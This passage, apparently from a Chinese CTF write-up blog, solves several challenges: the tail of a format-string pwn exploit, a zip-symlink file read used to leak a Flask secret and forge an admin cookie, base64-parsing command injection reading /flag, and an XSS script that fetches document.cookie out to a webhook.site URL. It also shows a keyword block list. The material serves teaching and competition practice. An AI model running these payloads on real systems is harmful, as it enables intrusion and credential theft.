class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    padding1 = (puts_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;padding1&#125;</span>c%13$hhn&#x27;</span>.encode()</span><br><span class="line">    padding2 = puts_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    fmtstr += <span class="string">f&#x27;%<span class="subst">&#123;padding2-padding1&#125;</span>c%12$hn&#x27;</span>.encode() </span><br><span class="line">    payload += fmtstr</span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    memset_got = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(memset_got)+p64(memset_got+<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/25/qwb2025-pwn/" data-id="cuid18H8l4FK0c3KXXPUt2ayp" data-title="qwb2025-pwn flagmarket" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-junior" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/10/junior/" class="article-date">
  <time class="dt-published" datetime="2025-10-10T12:06:01.000Z" itemprop="datePublished">2025-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h3><p>提供功能：上传压缩文件、成功解压后可以下载</p>
<p>flag 存放在根目录，文件名带随机字符：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAND=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&#x27;a-zA-Z0-9&#x27;</span> | <span class="built_in">head</span> -c 32)</span><br><span class="line">FLAG_FILE=<span class="string">&quot;/flag-<span class="variable">$RAND</span>.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$FLAG_FILE</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"><span class="built_in">export</span> FLAG=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>upload 关键代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 从session中获取当前用户的 role</span></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line">        <span class="comment"># admin 则可指定 dirname，否则随机文件夹名</span></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="comment"># 拼接 UPLOAD_FOLDER（workdir/uploads）和 dirname</span></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line">        <span class="comment"># 将解压文件存放在 workdir/uploads/dirname/ 下</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="comment"># 文件下载地址 /download/dirname</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>普通用户：</p>
<style>.atejcgmkbulv{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250913225038087.png" class="atejcgmkbulv" alt="image-20250913225038087">

<p>admin：</p>
<p><img src="/image-20250913231927943.png" alt="image-20250913231927943"></p>
<p>利用解压软链接可读任意文件</p>
<p>利用解压软链接也可以读取任意文件夹，但是由下载路径的不同只有admin用户才能读任意文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin 可以读文件夹</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># user 只能读文件</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder ,filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br></pre></td></tr></table></figure>

<p>flask框架，可以伪造cookie，提权成为admin</p>
<p>F12 拿到 <code>session</code> 值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU</span><br></pre></td></tr></table></figure>

<p>利用解压软链接读文件 <code>/proc/self/environ</code> ，获取 <code>FLASK_SECRET_KEY</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/environ env_link</span><br><span class="line">zip --symlinks env_link.zip env_link</span><br></pre></td></tr></table></figure>

<p>获取的  <code>FLASK_SECRET_KEY</code>为 <code>&quot;#mu0cw9F#7bBCoF!&quot;</code></p>
<p>使用flask-unsign 解码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-unsign</span></span><br><span class="line">flask-unsign -d -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNU&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-cookie.py</span></span><br><span class="line">python3 flask-cookie.py decode -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU&quot;</span><br></pre></td></tr></table></figure>

<p>得到 <code>&#123;&#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;user1&#39;&#125;</code>，修改为<code>&#123;&#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code>之后再编码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret &quot;#mu0cw9F#7bBCoF!&quot; --cookie &#x27;&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;user1&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>然后更新cookie值，构造指向根目录 &#x2F; 的软链接，同时指定文件夹为 <code>.</code> </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / root_link</span><br><span class="line">zip --symlinks root_link.zip root_link</span><br></pre></td></tr></table></figure>

<p>上传之后，访问 <code>/download/root_link</code> 即可获取根目录文件列表，下载flagxxxxx.txt文件即可</p>
<p>exp如下：</p>
<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>提供 <code>ping</code> 功能，用户输入合法 <code>ip</code> 地址，返回 <code>ping</code> 的结果</p>
<p>;<style>.qamshoinyvfu{zoom:67%;}</style><img src="/2025/10/10/junior/image-20250913234250983.png" class="qamshoinyvfu" alt="image-20250913234250983"></p>
<p>根据Dockerfile提示，FLAG存放在根目录</p>
<p>用户输入 <code>ip</code> 主要在 <code>run_ping</code> 函数中进行处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用base64.b64decode解码得到decoded_ip，并进行一系列检查</span></span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 对为解码的 ip_base64 进行检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 最后拼接到 command 的是 base64 -d ip_base64 的结构</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(command, shell=<span class="literal">True</span>, check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>

<p>对解码后的 <code>decoded_ip</code> 做了一系列的检查，但是拼接到 <code>command</code> 的是未解码<code>ip_base64</code></p>
<p>关键在于找出 <code>base64.b64decode</code> 和 <code>base64 -d</code> 的区别</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编码</span></span><br><span class="line">echo -n 8.8.8.8 | base64                            # 输出 OC44LjguOA==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 base64.b64decode 解码（python）</span></span><br><span class="line">base64.b64decode(&quot;OC44LjguOA==OC44LjguOA==&quot;).decode(&#x27;utf-8&#x27;)  # 仅输出 8.8.8.8 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 <span class="built_in">base64</span> -d 解码</span></span><br><span class="line">echo -n &quot;OC44LjguOA==OC44LjguOA==&quot; | base64 -d      # 输出 8.8.8.88.8.8.8 </span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">依次获取 8.8.8.8、<span class="string">&#x27;;ls /&#x27;</span>和<span class="string">&#x27;cat /flag&#x27;</span> 的<span class="built_in">base64</span>编码</span></span><br><span class="line">echo -n &quot;8.8.8.8&quot; | base64      # OC44LjguOA==</span><br><span class="line">echo -n &quot;;ls /&quot; | base64        # O2xzIC8=</span><br><span class="line">echo -n &quot;;cat /flag&quot; | base64   # O2NhdCAvZmxhZw==</span><br></pre></td></tr></table></figure>

<p>正常<code>ping</code> 一个<code>ip</code>地址，bp改包依次获取 根目录文件，查看<code>/flag</code>内容</p>
<p><img src="/image-20250914001106283.png" alt="image-20250914001106283"></p>
<h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>用户注册、登录之后，可写入笔记、然后提交审核，典型XSS</p>
<style>.fgarjeahbshi{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914001412760.png" class="fgarjeahbshi" alt="image-20250914001412760">

<p>flag存放在网页的cookie中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.add_cookies([&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>

<p>关键是判断xss点，以及怎么触发</p>
<p>从<code>/profile</code>中写入的内容会被存放在当前用户的 <code>bio</code>，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>提供 <code>/api/bio/&lt;string:username&gt;</code>访问写入的 bio，但是直接访问返回 403</p>
<p>查看 nginx.conf 配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location /api/bio/ &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line">location ~ \.(css|js)$ &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:5000;</span><br><span class="line">    proxy_ignore_headers Vary;</span><br><span class="line">    proxy_cache static_cache;      // 启用 Nginx 缓存，缓存区域叫 static_cache</span><br><span class="line">    proxy_cache_valid 200 10m;     // 缓存有效期为 10 分钟</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当请求的路径以 “.css”或者“.js”结尾时，就读取缓存的内容，而不是请求远程服务器</p>
<p>通过 <code>/view</code> 路由触发机器人通过 visit_url 函数访问 我们写入 bio 的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)    <span class="comment"># 访问 bio</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;&#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;...&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span>    <span class="comment">#  httpOnly不是httponly</span></span><br><span class="line">            &#125;])</span><br><span class="line">            ......</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)    <span class="comment"># 若访问的 url 页面中存在xss，则可以带出cookie</span></span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br></pre></td></tr></table></figure>

<p>思路如下：</p>
<p>注册用户名：<code>user.css</code></p>
<p>将payload写入 <code>bio</code>，<code>payload</code>如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">`https://webhook.site/b615b48c-adb7-4e53-97b6-ef4b71b4fa8f/<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 <code>/api/bio/user.css</code> ,生成缓存</p>
<p>然后在访问 &#x2F;view ，触发机器人读取 payload，并将cookie值带出</p>
<style>.muwifkxtpgsj{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914005025512.png" class="muwifkxtpgsj" alt="image-20250914005025512">

<h3 id="peekafork"><a href="#peekafork" class="headerlink" title="peekafork"></a>peekafork</h3><p>处理HTTP请求，并根据请求的文件名和offset读取文件内容</p>
<p>flag被写入某段内存中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">mm = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(flag))</span><br><span class="line">mm.write(flag)</span><br><span class="line">os.remove(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;proc&#x27;</span>, <span class="string">b&#x27;&lt;&#x27;</span>, <span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;^&#x27;</span>, <span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&#x27;&quot;&#x27;</span>, <span class="string">b&#x27;..&#x27;</span>, <span class="string">b&#x27;./&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(term <span class="keyword">in</span> initial_data.lower() <span class="keyword">for</span> term <span class="keyword">in</span> FORBIDDEN):</span><br><span class="line">        conn.sendall(<span class="string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">conn, addr, log, factor=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:   </span><br><span class="line">        request_data = conn.recv(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_data.startswith(<span class="string">b&quot;GET /&quot;</span>):</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]   <span class="comment"># 取出请求路径 </span></span><br><span class="line">            pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            length = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, path)    <span class="comment"># 匹配 ?offset=12&amp;length=123。仅匹配第一个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">                clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">                filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()  <span class="comment"># 去除首尾 &#x27;/&#x27;，得到filename</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            